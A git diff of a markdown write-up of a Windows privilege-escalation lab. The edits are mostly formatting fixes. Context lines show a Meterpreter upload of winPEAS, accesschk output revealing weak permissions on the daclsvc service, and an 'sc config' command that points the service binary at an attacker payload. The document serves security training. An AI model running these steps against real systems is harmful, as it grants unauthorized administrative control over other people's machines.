@@ -17,7 +17,7 @@
 * [Step 1 — Generating a Malicious Payload with msfvenom](#step-1--generating-a-malicious-payload-with-msfvenom)
 * [Step 2 — Setting Up Metasploit Listener and HTTP Server](#step-2--setting-up-metasploit-listener-and-http-server)
 * [Step 3 — Downloading the Payload on the Victim Machine](#step-3--downloading-the-payload-on-the-victim-machine)
-* [Step 4 — Transferring the Payload to PrivEsc Folder](#step-4--transferring-the-payload-to-privesc-folder)
+* [Step 4 — Transferring the Payload to C:\PrivEsc Folder](#step-4--transferring-the-payload-to-privesc-folder)
 * [Step 5 — Running the Payload and Getting a Meterpreter Shell](#step-5--running-the-payload-and-getting-a-meterpreter-shell)
 * [Step 6 — Enumerating the Victim and Uploading winPEAS](#step-6--enumerating-the-victim-and-uploading-winpeas)
 * [Step 7 — Running winPEAS to Find Privilege Escalation Paths](#step-7--running-winpeas-to-find-privilege-escalation-paths)
@@ -110,8 +110,6 @@ After changing the service binary path to my executable and restarting the servi
 | `accesschk.exe`       | `/home/kali/Desktop/tools/` | Check service permissions                |
 | `msfvenom`            | Built into Kali             | Create Windows payloads                  |
 | `Metasploit`          | Built into Kali             | Handle reverse Meterpreter connections   |
-| `certutil`            | Built into Windows          | Download files from a remote server      |
-| `Python3 HTTP Server` | Built into Kali             | Host payload files over HTTP             |
 
 ## Prerequisites
 
@@ -319,7 +317,7 @@ The session was running under a normal low privilege user account. The next step
 
 ### Uploaded `winPEAS`
 
-I uploaded winPEASany.exe from my Kali machine to the Windows victim using Meterpreter.
+I uploaded `winPEASany.exe` from my Kali machine to the Windows victim using Meterpreter.
 
 ```bash
 meterpreter > upload /home/kali/Desktop/tools/winPEASany.exe
@@ -344,7 +342,7 @@ meterpreter > upload /home/kali/Desktop/tools/winPEASany.exe
 
 ## Step 7 — Running `winPEAS` to Find Privilege Escalation Paths
 
-I opened a Windows shell from the Meterpreter session and ran winPEAS to check for possible privilege escalation paths.
+I opened a Windows shell from the Meterpreter session and ran `winPEAS` to check for possible privilege escalation paths.
 
 ```bash
 meterpreter > shell
@@ -352,7 +350,7 @@ meterpreter > shell
 ```cmd
 C:\PrivEsc> .\winPEASany.exe
 ```
-`winPEAS` scanned the system and found that the `daclsvc` service had weak permissions. The service permissions were not properly configured, which allowed a low privilege user to change the service settings. I selected daclsvc as my target and continued with the next steps.
+`winPEAS` scanned the system and found that the `daclsvc` service had weak permissions. The service permissions were not properly configured, which allowed a low privilege user to change the service settings. I selected `daclsvc` as my target and continued with the next steps.
 
 ## Step 8 — Verifying Service Permissions with `accesschk.exe`
 
@@ -409,10 +407,10 @@ RW daclsvc
 ```
 The important permissions were:
 
-`RW daclsvc` : I had read and write access to the service.
-`SERVICE_CHANGE_CONFIG` : I could change the service configuration, including the binary path.
-`SERVICE_START` : I could start the service.
-`SERVICE_STOP` : I could stop the service.
+- `RW daclsvc` : I had read and write access to the service.
+- `SERVICE_CHANGE_CONFIG` : I could change the service configuration, including the binary path.
+- `SERVICE_START` : I could start the service.
+- `SERVICE_STOP` : I could stop the service.
 
 `SERVICE_CHANGE_CONFIG` was the important permission because it allowed me to change the service executable path and point it to my own payload.
 
@@ -547,8 +545,9 @@ sc config daclsvc binpath= "C:\PrivEsc\privesc.exe"
 ```
 The service binary path was changed from the original file to my payload.
 
-|------Field--------|-----------------------Before-------------------|---------------After--------|
-|BINARY_PATH_NAME   |C:\Program Files\DACL Service\daclservice.exe   |C:\PrivEsc\privesc.exe      |
+| Field             | Before                                      | After                  |
+|-------------------|---------------------------------------------|------------------------|
+| BINARY_PATH_NAME  | C:\Program Files\DACL Service\daclservice.exe | C:\PrivEsc\privesc.exe |
 
 <p align="center">
   <img src="/Windows-Privilege-Escalation/insecure service configuration/images/step11-2.png" width="600">
